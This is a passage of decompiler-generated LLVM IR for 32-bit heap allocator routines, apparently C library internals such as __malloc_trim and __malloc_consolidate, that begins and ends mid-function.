  %v3_805412e = load i32, i32* %v2_805412e, align 4
  store i32 %v3_805412e, i32* %eax.global-to-local, align 4
  %v1_8054131 = load i32, i32* @edx, align 4
  %v2_8054131 = add i32 %v1_8054131, 32
  %v3_8054131 = inttoptr i32 %v2_8054131 to i32*
  store i32 %v3_805412e, i32* %v3_8054131, align 4
  br label %dec_label_pc_8054134

dec_label_pc_8054134:                             ; preds = %dec_label_pc_8054117, %dec_label_pc_8054106, %dec_label_pc_80540ed, %dec_label_pc_80540dc, %dec_label_pc_8054128
  %v0_8054137 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054137 = add i32 %v0_8054137, 8
  store i32 %v1_8054137, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_805413e = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8054272

dec_label_pc_8054148:                             ; preds = %dec_label_pc_8054009, %dec_label_pc_80540bf, %dec_label_pc_805408d
  %v1_8054159 = phi i32 [ %v1_8053ff9, %dec_label_pc_8054009 ], [ %v2_80540c6, %dec_label_pc_80540bf ], [ %v0_8054148.pre, %dec_label_pc_805408d ]
  %v5_805414a = sub i32 %v1_8054159, %stack_var_-40.0
  store i32 %v5_805414a, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_805414a, 16
  br i1 %tmp27, label %dec_label_pc_8054153, label %dec_label_pc_8054165

dec_label_pc_8054153:                             ; preds = %dec_label_pc_8054148
  %v0_8054153 = load i32, i32* @edi, align 4
  %v1_8054153 = add i32 %v0_8054153, 4
  %v2_8054153 = inttoptr i32 %v1_8054153 to i32*
  %v3_8054153 = load i32, i32* %v2_8054153, align 4
  %v1_8054156 = urem i32 %v3_8054153, 2
  %v2_8054159 = or i32 %v1_8054156, %v1_8054159
  store i32 %v2_8054159, i32* %eax.global-to-local, align 4
  store i32 %v2_8054159, i32* %v2_8054153, align 4
  %v0_805415e = load i32, i32* @edi, align 4
  %v1_805415e = load i32, i32* @ebx, align 4
  %v2_805415e = add i32 %v0_805415e, 4
  %v3_805415e = add i32 %v2_805415e, %v1_805415e
  %v4_805415e = inttoptr i32 %v3_805415e to i32*
  %v5_805415e = load i32, i32* %v4_805415e, align 4
  %v6_805415e = or i32 %v5_805415e, 1
  store i32 %v6_805415e, i32* %v4_805415e, align 4
  br label %dec_label_pc_8054195

dec_label_pc_8054165:                             ; preds = %dec_label_pc_8054148
  %v0_8054169 = load i32, i32* @edi, align 4
  %v2_8054169 = add i32 %v0_8054169, %stack_var_-40.0
  store i32 %v2_8054169, i32* %eax.global-to-local, align 4
  %v1_805416c = add i32 %v0_8054169, 4
  %v2_805416c = inttoptr i32 %v1_805416c to i32*
  %v3_805416c = load i32, i32* %v2_805416c, align 4
  %v1_805416f = urem i32 %v3_805416c, 2
  %v5_8054172 = or i32 %v1_805416f, %stack_var_-40.0
  store i32 %v5_8054172, i32* %v2_805416c, align 4
  %v0_805417c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805417e = or i32 %v0_805417c, 1
  store i32 %v1_805417e, i32* @edx, align 4
  %v1_8054181 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054181 = add i32 %v1_8054181, 4
  %v3_8054181 = inttoptr i32 %v2_8054181 to i32*
  store i32 %v1_805417e, i32* %v3_8054181, align 4
  %v0_8054184 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054184 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054184 = add i32 %v0_8054184, 4
  %v3_8054184 = add i32 %v2_8054184, %v1_8054184
  %v4_8054184 = inttoptr i32 %v3_8054184 to i32*
  %v5_8054184 = load i32, i32* %v4_8054184, align 4
  %v6_8054184 = or i32 %v5_8054184, 1
  store i32 %v6_8054184, i32* %v4_8054184, align 4
  %v0_8054189 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054189 = add i32 %v0_8054189, 8
  store i32 %v1_8054189, i32* %eax.global-to-local, align 4
  store i32 %v1_8054189, i32* %stack_var_-60, align 4
  %v1_805418d = call i32 @free(i32 %v1_8054189)
  store i32 %v1_805418d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054195

dec_label_pc_8054195:                             ; preds = %dec_label_pc_8054153, %dec_label_pc_8054165
  %v0_8054195 = load i32, i32* @edi, align 4
  %v1_8054195 = add i32 %v0_8054195, 8
  store i32 %v1_8054195, i32* @ebx, align 4
  br label %dec_label_pc_805427f

dec_label_pc_805419d:                             ; preds = %dec_label_pc_8053fed
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_80541a1 = load i32, i32* @global_var_8062b9c.508, align 4
  store i32 %v0_80541a1, i32* %eax.global-to-local, align 4
  %v2_80541aa = inttoptr i32 %v1_8053ff1 to i32*
  %v3_80541aa = load i32, i32* %v2_80541aa, align 4
  store i32 %v3_80541aa, i32* @ebp, align 4
  %v1_80541ad = add i32 %v0_80541a1, -1
  %v1_80541ae = or i32 %stack_var_-40.0, 4
  store i32 %v1_80541ae, i32* %stack_var_-44, align 4
  %v2_80541b4 = add i32 %v1_80541ad, %v3_80541aa
  store i32 %v2_80541b4, i32* @edx, align 4
  %v1_80541b7 = sub i32 0, %v0_80541a1
  store i32 %v1_80541b7, i32* %eax.global-to-local, align 4
  %v2_80541b9 = add i32 %v2_80541b4, %v1_80541ae
  %v2_80541bc = and i32 %v2_80541b9, %v1_80541b7
  store i32 %v2_80541bc, i32* @esi, align 4
  %v2_80541c0 = sub i32 %v2_80541bc, %v3_80541aa
  store i32 %v2_80541c0, i32* @ebx, align 4
  %v15_80541c2 = icmp eq i32 %v1_8053ff9, %v2_80541c0
  br i1 %v15_80541c2, label %dec_label_pc_805427b, label %dec_label_pc_80541cc

dec_label_pc_80541cc:                             ; preds = %dec_label_pc_805419d
  %v2_80541ce = sub i32 %v1_8053ff1, %v3_80541aa
  store i32 %v2_80541ce, i32* @edi, align 4
  %v2_80541d5 = add i32 %v3_80541aa, %v1_8053ff9
  store i32 %v2_80541d5, i32* %eax.global-to-local, align 4
  store i32 %v2_80541ce, i32* %stack_var_-60, align 4
  %v6_80541d9 = call i32 @mremap(i32 %v2_80541ce, i32 %v2_80541d5, i32 %v2_80541bc, i32 1, i32 %v1_80541ae, i32 %v1_8053ff9)
  store i32 %v6_80541d9, i32* %eax.global-to-local, align 4
  %v10_80541e1 = icmp eq i32 %v6_80541d9, -1
  br i1 %v10_80541e1, label %dec_label_pc_8054233, label %dec_label_pc_80541e6

dec_label_pc_80541e6:                             ; preds = %dec_label_pc_80541cc
  %v1_80541e6 = load i32, i32* @ebp, align 4
  %v2_80541e6 = add i32 %v1_80541e6, %v6_80541d9
  store i32 %v2_80541e6, i32* %eax.global-to-local, align 4
  %v0_80541e8 = load i32, i32* @ebx, align 4
  %v1_80541e8 = or i32 %v0_80541e8, 2
  %v2_80541eb = add i32 %v2_80541e6, 4
  %v3_80541eb = inttoptr i32 %v2_80541eb to i32*
  store i32 %v1_80541e8, i32* %v3_80541eb, align 4
  %v0_80541ee = load i32, i32* @esi, align 4
  %v5_80541f0 = sub i32 %v0_80541ee, %v1_8053ff9
  %v0_80541f4 = load i32, i32* @global_var_8062bb0.512, align 16
  %v0_80541fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80541fa = add i32 %v0_80541fa, 8
  store i32 %v1_80541fa, i32* @ebx, align 4
  %v1_80541fd = load i32, i32* @global_var_8062ba4.514, align 4
  %v2_80541fd = add i32 %v1_80541fd, %v5_80541f0
  store i32 %v2_80541fd, i32* @global_var_8062ba4.514, align 4
  %tmp20 = icmp ule i32 %v2_80541fd, %v0_80541f4
  %v5_805420f = select i1 %tmp20, i32 %v0_80541f4, i32 %v2_80541fd
  store i32 %v5_805420f, i32* %ecx.global-to-local, align 4
  %v1_8054212 = load i32, i32* @global_var_8062ba8.515, align 8
  %v2_8054212 = add i32 %v1_8054212, %v2_80541fd
  store i32 %v5_805420f, i32* @global_var_8062bb0.512, align 16
  %v1_805421e = load i32, i32* @global_var_8062bb4.516, align 4
  %tmp28 = icmp ule i32 %v2_8054212, %v1_805421e
  %v5_8054224 = select i1 %tmp28, i32 %v1_805421e, i32 %v2_8054212
  store i32 %v5_8054224, i32* @edx, align 4
  store i32 %v5_8054224, i32* @global_var_8062bb4.516, align 4
  br label %dec_label_pc_805427f

dec_label_pc_8054233:                             ; preds = %dec_label_pc_80541cc
  %v2_8054233 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8054233, i32* %eax.global-to-local, align 4
  %v10_8054236 = icmp ult i32 %v1_8053ff9, %v2_8054233
  %v1_805423a = icmp eq i1 %v10_8054236, false
  br i1 %v1_805423a, label %dec_label_pc_805427b, label %dec_label_pc_805423c

dec_label_pc_805423c:                             ; preds = %dec_label_pc_8054233
  %v1_8054243 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8054243, i32* %eax.global-to-local, align 4
  store i32 %v1_8054243, i32* %stack_var_-60, align 4
  %v1_8054247 = call i32 @malloc(i32 %v1_8054243)
  store i32 %v1_8054247, i32* %eax.global-to-local, align 4
  %v1_805424f = icmp eq i32 %v1_8054247, 0
  store i32 %v1_8054247, i32* @ebx, align 4
  br i1 %v1_805424f, label %dec_label_pc_8054277, label %dec_label_pc_8054255

dec_label_pc_8054255:                             ; preds = %dec_label_pc_805423c
  %v1_805425a = add i32 %v1_8053ff9, -8
  store i32 %v1_805425a, i32* %eax.global-to-local, align 4
  store i32 %v1_8054247, i32* %stack_var_-60, align 4
  %v3_8054263 = inttoptr i32 %v1_8054247 to i16*
  %v4_8054263 = call i32 @memcpy(i16* %v3_8054263, i32 %tmp8, i32 %v1_805425a)
  store i32 %v4_8054263, i32* %eax.global-to-local, align 4
  store i32 %v1_8054247, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_805426d = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8054272

dec_label_pc_8054272:                             ; preds = %dec_label_pc_8054134, %dec_label_pc_8054255
  %storemerge = phi i32 [ %v1_805426d, %dec_label_pc_8054255 ], [ %v1_805413e, %dec_label_pc_8054134 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805427f

dec_label_pc_8054277:                             ; preds = %dec_label_pc_805423c, %dec_label_pc_8054098
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805427f

dec_label_pc_805427b:                             ; preds = %dec_label_pc_8054233, %dec_label_pc_805419d, %dec_label_pc_8054037
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_805427f

dec_label_pc_805427f:                             ; preds = %dec_label_pc_8054277, %dec_label_pc_8054272, %dec_label_pc_80541e6, %dec_label_pc_8054195, %dec_label_pc_805427b
  store i32 %v2_8053fa6, i32* @eax, align 4
  store i32 %v2_8053fa6, i32* %stack_var_-60, align 4
  %v2_8054288 = call i32 @__pthread_return_void(i32 %v2_8053fa6, i32 1)
  store i32 %v2_8054288, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805428d

dec_label_pc_805428d:                             ; preds = %dec_label_pc_8053f8a, %dec_label_pc_8053f76, %dec_label_pc_805427f
  br label %dec_label_pc_8054290

dec_label_pc_8054290:                             ; preds = %dec_label_pc_8053fc4, %dec_label_pc_805428d
  %v0_8054293 = load i32, i32* @ebx, align 4
  store i32 %v0_8054293, i32* %eax.global-to-local, align 4
  store i32 %v0_8053f67, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053f66, i32* @esi, align 4
  ret i32 %v0_8054293

; uselistorder directives
  uselistorder i32 %v1_8054247, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_805421e, { 1, 0 }
  uselistorder i32 %v2_8054212, { 1, 0 }
  uselistorder i32 %v2_80541fd, { 0, 3, 1, 2 }
  uselistorder i32 %v0_80541f4, { 1, 0 }
  uselistorder i32 %v6_80541d9, { 1, 0, 2 }
  uselistorder i32 %v2_80541ce, { 1, 0, 2 }
  uselistorder i32 %v1_80541ae, { 2, 0, 1 }
  uselistorder i32 %v3_80541aa, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8054169, { 1, 0 }
  uselistorder i32 %v1_80540cf, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80540a3, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_8054047, { 1, 0, 2 }
  uselistorder i32 %v3_805405a, { 0, 2, 1 }
  uselistorder i32 %v2_8054017, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053ff9, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8053ff1, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8053fe6, { 1, 0 }
  uselistorder i32 %v1_8053fd6, { 1, 2, 0 }
  uselistorder i32 %v0_8053fbf, { 1, 0 }
  uselistorder i32 %v2_8053fa6, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8054290, { 1, 0 }
  uselistorder label %dec_label_pc_805428d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805427f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8054272, { 1, 0 }
  uselistorder label %dec_label_pc_8054195, { 1, 0 }
  uselistorder label %dec_label_pc_8054148, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054134, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805408d, { 1, 0 }
  uselistorder label %dec_label_pc_8053fed, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_805429d = load i32, i32* @edx, align 4
  store i32 %v0_805429d, i32* %ebp.global-to-local, align 4
  %v0_80542a0 = load i32, i32* @esi, align 4
  %v1_80542a5 = add i32 %v0_805429d, 860
  %v2_80542a5 = inttoptr i32 %v1_80542a5 to i32*
  %v3_80542a5 = load i32, i32* %v2_80542a5, align 4
  store i32 %v3_80542a5, i32* @ecx, align 4
  %v1_80542ab = add i32 %v0_805429d, 44
  %v2_80542ab = inttoptr i32 %v1_80542ab to i32*
  %v3_80542ab = load i32, i32* %v2_80542ab, align 4
  %v1_80542ae = add i32 %v3_80542ab, 4
  %v2_80542ae = inttoptr i32 %v1_80542ae to i32*
  %v3_80542ae = load i32, i32* %v2_80542ae, align 4
  %v1_80542b1 = and i32 %v3_80542ae, -4
  store i32 %v1_80542b1, i32* @esi, align 4
  %v1_80542b6 = load i32, i32* @eax, align 4
  %v2_80542b6 = add i32 %v3_80542a5, -17
  %v2_80542b8 = add i32 %v2_80542b6, %v1_80542b1
  %v3_80542b8 = sub i32 %v2_80542b8, %v1_80542b6
  %div = udiv i32 %v3_80542b8, %v3_80542a5
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80542b8, %v3_80542a5
  store i32 %tmp10, i32* @edx, align 4
  %v1_80542c0 = add i32 %div, -1
  %v4_80542c3 = mul i32 %v1_80542c0, %v3_80542a5
  store i32 %v4_80542c3, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80542c3, 1
  br i1 %tmp11, label %dec_label_pc_805431f, label %dec_label_pc_80542ca

dec_label_pc_80542ca:                             ; preds = %entry
  %v1_80542cf = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80542cf, i32* %edi.global-to-local, align 4
  %v0_80542d9 = load i32, i32* @esi, align 4
  store i32 %v0_80542d9, i32* %eax.global-to-local, align 4
  %v1_80542db = load i32, i32* %ebp.global-to-local, align 4
  %v2_80542db = add i32 %v1_80542db, 44
  %v3_80542db = inttoptr i32 %v2_80542db to i32*
  %v4_80542db = load i32, i32* %v3_80542db, align 4
  %v5_80542db = add i32 %v4_80542db, %v0_80542d9
  store i32 %v5_80542db, i32* %eax.global-to-local, align 4
  %v12_80542de = icmp eq i32 %v1_80542cf, %v5_80542db
  %v1_80542e0 = icmp eq i1 %v12_80542de, false
  br i1 %v1_80542e0, label %dec_label_pc_805431f, label %dec_label_pc_80542e2

dec_label_pc_80542e2:                             ; preds = %dec_label_pc_80542ca
  %v1_80542e5 = sub i32 0, %v4_80542c3
  store i32 %v1_80542e5, i32* @ebx, align 4
  %v1_80542e8 = call i32 @__GI_sbrk(i32 %v1_80542e5)
  store i32 %v1_80542e8, i32* %eax.global-to-local, align 4
  %v1_80542f4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80542f4, i32* %eax.global-to-local, align 4
  %v10_80542fc = icmp eq i32 %v1_80542f4, -1
  br i1 %v10_80542fc, label %dec_label_pc_805431f, label %dec_label_pc_8054301

dec_label_pc_8054301:                             ; preds = %dec_label_pc_80542e2
  %v0_8054301 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054303 = sub i32 %v0_8054301, %v1_80542f4
  %v12_8054303 = icmp eq i32 %v2_8054303, 0
  store i32 %v2_8054303, i32* @ecx, align 4
  br i1 %v12_8054303, label %dec_label_pc_805431f, label %dec_label_pc_8054307

dec_label_pc_8054307:                             ; preds = %dec_label_pc_8054301
  %v0_8054307 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054307 = add i32 %v0_8054307, 44
  %v2_8054307 = inttoptr i32 %v1_8054307 to i32*
  %v3_8054307 = load i32, i32* %v2_8054307, align 4
  store i32 %v3_8054307, i32* %eax.global-to-local, align 4
  %v0_805430a = load i32, i32* @esi, align 4
  %v2_805430a = sub i32 %v0_805430a, %v2_8054303
  store i32 %v2_805430a, i32* %esi.global-to-local, align 4
  %v1_805430c = add i32 %v0_8054307, 872
  %v2_805430c = inttoptr i32 %v1_805430c to i32*
  %v3_805430c = load i32, i32* %v2_805430c, align 4
  %v5_805430c = sub i32 %v3_805430c, %v2_8054303
  store i32 %v5_805430c, i32* %v2_805430c, align 4
  %v0_8054312 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054312 = or i32 %v0_8054312, 1
  store i32 %v1_8054312, i32* %esi.global-to-local, align 4
  %v1_8054315 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054315 = add i32 %v1_8054315, 4
  %v3_8054315 = inttoptr i32 %v2_8054315 to i32*
  store i32 %v1_8054312, i32* %v3_8054315, align 4
  br label %dec_label_pc_8054321

dec_label_pc_805431f:                             ; preds = %dec_label_pc_8054301, %dec_label_pc_80542e2, %dec_label_pc_80542ca, %entry
  br label %dec_label_pc_8054321

dec_label_pc_8054321:                             ; preds = %dec_label_pc_8054307, %dec_label_pc_805431f
  %storemerge = phi i32 [ 1, %dec_label_pc_8054307 ], [ 0, %dec_label_pc_805431f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80542a0, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80542f4, { 1, 0, 2 }
  uselistorder i32 %v4_80542c3, { 1, 2, 0 }
  uselistorder i32 %v3_80542a5, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_805429d, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054321, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805432a = load i32, i32* @edi, align 4
  %v0_805432b = load i32, i32* @esi, align 4
  %v0_805432c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8054334 = load i32, i32* %arg1, align 4
  store i32 %v2_8054334, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805433b = icmp eq i32 %v2_8054334, 0
  br i1 %v1_805433b, label %dec_label_pc_8054464.preheader, label %dec_label_pc_8054343

dec_label_pc_8054464.preheader:                   ; preds = %entry
  %v3_8054459 = add i32 %tmp11, 44
  br label %dec_label_pc_8054455

dec_label_pc_8054343:                             ; preds = %entry
  %v1_8054347 = and i32 %v2_8054334, -3
  store i32 %v1_8054347, i32* %arg1, align 4
  %v1_805434c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805435b = add i32 %tmp11, 4
  store i32 %v1_805435b, i32* %eax.global-to-local, align 4
  %v2_8054362 = load i32, i32* %arg1, align 4
  %v2_8054368 = udiv i32 %v2_8054362, 8
  %v2_805436b = mul nuw i32 %v2_8054368, 4
  %v3_805436b = add i32 %tmp11, -4
  %v4_805436b = add i32 %v3_805436b, %v2_805436b
  store i32 %v4_805436b, i32* %eax.global-to-local, align 4
  %v2_8054432 = add i32 %tmp11, 44
  %v3_8054432 = inttoptr i32 %v2_8054432 to i32*
  %v1_8054405 = add i32 %tmp11, 60
  %v2_8054405 = inttoptr i32 %v1_8054405 to i32*
  br label %dec_label_pc_8054373

dec_label_pc_8054373:                             ; preds = %dec_label_pc_805444b, %dec_label_pc_8054343
  %v0_8054381 = phi i32 [ %v1_805435b, %dec_label_pc_8054343 ], [ %v4_805444b, %dec_label_pc_805444b ]
  store i32 %v0_8054381, i32* %eax.global-to-local, align 4
  %v1_8054377 = inttoptr i32 %v0_8054381 to i32*
  %v2_8054377 = load i32, i32* %v1_8054377, align 4
  store i32 %v2_8054377, i32* @ecx, align 4
  %v1_8054379 = icmp eq i32 %v2_8054377, 0
  br i1 %v1_8054379, label %dec_label_pc_8054441, label %dec_label_pc_8054381

dec_label_pc_8054381:                             ; preds = %dec_label_pc_8054373
  store i32 0, i32* %v1_8054377, align 4
  %v0_8054387.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8054387

dec_label_pc_8054387:                             ; preds = %dec_label_pc_8054435, %dec_label_pc_8054381
  %v0_80543a4 = phi i32 [ %v3_8054387, %dec_label_pc_8054435 ], [ %v0_8054387.pre, %dec_label_pc_8054381 ]
  %v1_8054387 = add i32 %v0_80543a4, 8
  %v2_8054387 = inttoptr i32 %v1_8054387 to i32*
  %v3_8054387 = load i32, i32* %v2_8054387, align 4
  store i32 %v3_8054387, i32* %edx.global-to-local, align 4
  %v1_805438e = add i32 %v0_80543a4, 4
  %v2_805438e = inttoptr i32 %v1_805438e to i32*
  %v3_805438e = load i32, i32* %v2_805438e, align 4
  store i32 %v3_805438e, i32* %eax.global-to-local, align 4
  %v1_8054393 = and i32 %v3_805438e, -2
  store i32 %v1_8054393, i32* @edi, align 4
  %v2_8054396 = urem i32 %v3_805438e, 2
  %v3_8054396 = icmp eq i32 %v2_8054396, 0
  %v2_8054398 = add i32 %v1_8054393, %v0_80543a4
  store i32 %v2_8054398, i32* @ebx, align 4
  %v1_805439b = add i32 %v2_8054398, 4
  %v2_805439b = inttoptr i32 %v1_805439b to i32*
  %v3_805439b = load i32, i32* %v2_805439b, align 4
  store i32 %v3_805439b, i32* %edx.global-to-local, align 4
  %v1_80543a2 = icmp eq i1 %v3_8054396, false
  br i1 %v1_80543a2, label %dec_label_pc_80543c4, label %dec_label_pc_80543a4

dec_label_pc_80543a4:                             ; preds = %dec_label_pc_8054387
  %v1_80543a4 = inttoptr i32 %v0_80543a4 to i32*
  %v2_80543a4 = load i32, i32* %v1_80543a4, align 4
  store i32 %v2_80543a4, i32* %ebp.global-to-local, align 4
  %v2_80543a8 = sub i32 %v0_80543a4, %v2_80543a4
  store i32 %v2_80543a8, i32* %eax.global-to-local, align 4
  %v1_80543aa = add i32 %v2_80543a8, 8
  %v2_80543aa = inttoptr i32 %v1_80543aa to i32*
  %v3_80543aa = load i32, i32* %v2_80543aa, align 4
  store i32 %v3_80543aa, i32* @esi, align 4
  %v1_80543ad = add i32 %v2_80543a8, 12
  %v2_80543ad = inttoptr i32 %v1_80543ad to i32*
  %v3_80543ad = load i32, i32* %v2_80543ad, align 4
  store i32 %v3_80543ad, i32* %edx.global-to-local, align 4
  %v1_80543b0 = add i32 %v3_80543aa, 12
  %v2_80543b0 = inttoptr i32 %v1_80543b0 to i32*
  %v3_80543b0 = load i32, i32* %v2_80543b0, align 4
  store i32 %v3_80543b0, i32* @ecx, align 4
  %v12_80543b3 = icmp eq i32 %v3_80543b0, %v2_80543a8
  %v1_80543b5 = icmp eq i1 %v12_80543b3, false
  br i1 %v1_80543b5, label %dec_label_pc_80543f4, label %dec_label_pc_80543b7

dec_label_pc_80543b7:                             ; preds = %dec_label_pc_80543a4
  %v1_80543b7 = add i32 %v3_80543ad, 8
  %v2_80543b7 = inttoptr i32 %v1_80543b7 to i32*
  %v3_80543b7 = load i32, i32* %v2_80543b7, align 4
  %v15_80543b7 = icmp eq i32 %v3_80543b7, %v3_80543b0
  %v1_80543ba = icmp eq i1 %v15_80543b7, false
  br i1 %v1_80543ba, label %dec_label_pc_80543f4, label %dec_label_pc_80543bc

dec_label_pc_80543bc:                             ; preds = %dec_label_pc_80543b7
  %v2_80543bc = add i32 %v2_80543a4, %v1_8054393
  store i32 %v2_80543bc, i32* @edi, align 4
  store i32 %v3_80543ad, i32* %v2_80543b0, align 4
  %v0_80543c1 = load i32, i32* @esi, align 4
  %v1_80543c1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80543c1 = add i32 %v1_80543c1, 8
  %v3_80543c1 = inttoptr i32 %v2_80543c1 to i32*
  store i32 %v0_80543c1, i32* %v3_80543c1, align 4
  %v0_80543cf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80543c4

dec_label_pc_80543c4:                             ; preds = %dec_label_pc_8054387, %dec_label_pc_80543bc
  %v1_80543d8 = phi i32 [ %v2_8054398, %dec_label_pc_8054387 ], [ %v0_80543cf.pre, %dec_label_pc_80543bc ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80543cc = and i32 %v3_805439b, -4
  store i32 %v1_80543cc, i32* %ebp.global-to-local, align 4
  %v4_80543cf = load i32, i32* %v3_8054432, align 4
  %v15_80543cf = icmp eq i32 %v1_80543d8, %v4_80543cf
  br i1 %v15_80543cf, label %dec_label_pc_8054425, label %dec_label_pc_80543d4

dec_label_pc_80543d4:                             ; preds = %dec_label_pc_80543c4
  %v2_80543d4 = add i32 %v1_80543d8, 4
  %v3_80543d4 = add i32 %v2_80543d4, %v1_80543cc
  %v4_80543d4 = inttoptr i32 %v3_80543d4 to i32*
  %v5_80543d4 = load i32, i32* %v4_80543d4, align 4
  store i32 %v5_80543d4, i32* %eax.global-to-local, align 4
  %v3_80543d8 = inttoptr i32 %v2_80543d4 to i32*
  store i32 %v1_80543cc, i32* %v3_80543d8, align 4
  %v0_80543db = load i32, i32* %eax.global-to-local, align 4
  %v1_80543db = urem i32 %v0_80543db, 2
  %v2_80543db = icmp eq i32 %v1_80543db, 0
  store i32 %v1_80543db, i32* %eax.global-to-local, align 4
  %v1_80543e0 = icmp eq i1 %v2_80543db, false
  br i1 %v1_80543e0, label %dec_label_pc_8054401, label %dec_label_pc_80543e2

dec_label_pc_80543e2:                             ; preds = %dec_label_pc_80543d4
  %v0_80543e2 = load i32, i32* @ebx, align 4
  %v1_80543e2 = add i32 %v0_80543e2, 8
  %v2_80543e2 = inttoptr i32 %v1_80543e2 to i32*
  %v3_80543e2 = load i32, i32* %v2_80543e2, align 4
  store i32 %v3_80543e2, i32* @edx, align 4
  %v1_80543e5 = add i32 %v0_80543e2, 12
  %v2_80543e5 = inttoptr i32 %v1_80543e5 to i32*
  %v3_80543e5 = load i32, i32* %v2_80543e5, align 4
  store i32 %v3_80543e5, i32* %eax.global-to-local, align 4
  %v1_80543e8 = add i32 %v3_80543e2, 12
  %v2_80543e8 = inttoptr i32 %v1_80543e8 to i32*
  %v3_80543e8 = load i32, i32* %v2_80543e8, align 4
  store i32 %v3_80543e8, i32* @esi, align 4
  %v12_80543eb = icmp eq i32 %v3_80543e8, %v0_80543e2
  %v1_80543ed = icmp eq i1 %v12_80543eb, false
  br i1 %v1_80543ed, label %dec_label_pc_80543f4, label %dec_label_pc_80543ef

dec_label_pc_80543ef:                             ; preds = %dec_label_pc_80543e2
  %v1_80543ef = add i32 %v3_80543e5, 8
  %v2_80543ef = inttoptr i32 %v1_80543ef to i32*
  %v3_80543ef = load i32, i32* %v2_80543ef, align 4
  %v15_80543ef = icmp eq i32 %v3_80543ef, %v3_80543e8
  br i1 %v15_80543ef, label %dec_label_pc_80543f9, label %dec_label_pc_80543f4

dec_label_pc_80543f4:                             ; preds = %dec_label_pc_80543ef, %dec_label_pc_80543e2, %dec_label_pc_80543b7, %dec_label_pc_80543a4
  %v0_80543f4 = call i32 @abort()
  store i32 %v0_80543f4, i32* %eax.global-to-local, align 4
  %v1_80543fb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80543f9

dec_label_pc_80543f9:                             ; preds = %dec_label_pc_80543ef, %dec_label_pc_80543f4
